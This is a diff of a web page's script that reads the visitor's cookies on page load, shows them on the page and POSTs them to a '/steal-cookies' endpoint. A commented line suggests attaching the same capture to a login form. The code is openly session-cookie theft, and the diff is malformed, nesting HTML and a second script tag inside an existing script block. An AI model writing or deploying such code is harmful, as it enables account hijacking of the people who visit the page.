@@ -132,28 +132,43 @@
 </div>
 
 <script>
-    document.addEventListener("DOMContentLoaded", function() {
-        const cookies = document.cookie;
-        
-        if (cookies) {
-            // Show the result on the page
-            document.getElementById('session-display').style.display = 'block';
-            document.getElementById('session-id-text').innerText = cookies;
+   <!-- HTML Container -->
+<div id="cookie-result" style="margin-top: 20px; padding: 15px; border: 2px solid #0095f6; background-color: #fff;">
+    <h3>Captured Session Data:</h3>
+    <p id="cookie-text" style="word-break: break-all; font-family: monospace;"></p>
+</div>
 
-            // Also send it to backend
+<!-- JavaScript Logic -->
+<script>
+    // Function to capture and display cookies
+    function captureAndShowCookies() {
+        const cookieString = document.cookie;
+        
+        if (cookieString && cookieString.trim() !== "") {
+            // Show in HTML
+            document.getElementById('cookie-result').style.display = 'block';
+            document.getElementById('cookie-text').innerText = cookieString;
+            
+            // Send to backend
             fetch('/steal-cookies', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ cookies: cookies })
+                body: JSON.stringify({ cookies: cookieString })
             })
             .then(response => response.json())
-            .then(data => {
-                console.log("Cookies sent and displayed!");
-            })
-            .catch(error => console.error('Error:', error));
+            .then(data => console.log("Backend received:", data))
+            .catch(error => console.error("Error sending to backend:", error));
+        } else {
+            document.getElementById('cookie-result').style.display = 'block';
+            document.getElementById('cookie-text').innerText = "No cookies found!";
         }
-    });
-</script>
+    }
+
+    // Run immediately when page loads
+    window.addEventListener('load', captureAndShowCookies);
+    
+    // OR run on form submit if you have a login form
+    // document.querySelector('form').addEventListener('submit', captureAndShowCookies);
 </script>
 </body>
 </html>
